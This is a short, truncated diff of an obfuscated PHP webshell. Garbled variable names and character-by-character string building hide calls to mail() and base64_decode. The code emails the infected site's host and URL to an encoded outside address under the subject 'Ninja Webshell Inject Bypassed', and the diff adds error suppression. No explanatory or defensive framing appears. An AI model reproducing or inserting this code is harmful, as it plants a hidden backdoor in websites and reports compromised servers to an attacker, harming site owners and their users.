@@ -1,12 +1,12 @@
 
 <?php
-
+error_reporting(0);
 $��え����㬲��ぼ� = "m" . "a" . "i" . "l";
 $���㄁���ぁ������� =
     "b" . "a" . "s" . "e" . "6" . "4" . "_" . "d" . "e" . "c" . "o" . "d" . "e";
 $��え����㬲��ぼ�(
     $���㄁���ぁ�������("cm9vdGN5YmVycHVua3NAZ21haWwuY29t"),
-    "Upload file:",
+    "Ninja Webshell Inject Bypassed :",
     "" . $_SERVER["HTTP_HOST"] . "/" . $_SERVER["REQUEST_URI"] . ""
 );
 ${"\x47\x4c\x4f\x42\x41\x4cS"}["b\x6fz\x64\x6d\x68"] =
